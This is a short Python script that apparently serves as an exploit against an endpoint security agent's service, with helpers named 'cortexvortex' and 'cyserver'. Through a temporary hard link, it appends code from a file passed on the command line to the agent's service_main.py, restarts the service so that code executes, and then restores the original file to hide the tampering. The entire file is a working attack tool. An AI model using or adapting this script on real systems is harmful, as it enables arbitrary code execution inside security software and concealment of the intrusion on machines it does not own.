import sys
sys.path.append("..")

import logging
from time import sleep

import cortexvortex
from logger import init_logger


def insert_malicous_code(malicous_file_path, file_to_insert):
    with open(malicous_file_path,'r') as malicous_file:
        malicous_script = '\n' + malicous_file.read()

    with open(file_to_insert,'a') as target_file:
        target_file.write(malicous_script)


def main():
    init_logger()

    logging.info("Creating temp hard link to %s", cortexvortex.SERVICE_MAIN_PY_PATH)
    temp_service_main = cortexvortex.create_temp_hard_link(cortexvortex.SERVICE_MAIN_PY_PATH)
    if temp_service_main:
        logging.info("Hard link created sucussfully")

    with open(temp_service_main,'r') as original_service_main:
        original_service_main_data =original_service_main.read()

    logging.info("Inserting code to service_main.py")
    insert_malicous_code(sys.argv[1], temp_service_main)
    cortexvortex.restart_cyserver()

    logging.info("Revert Changes")
    with open(temp_service_main,'w') as service_main:
        logging.info("Going to insert original data to service_main.py")
        service_main.write(original_service_main_data)
        
    logging.info("Done")

if __name__ == "__main__":
    main()
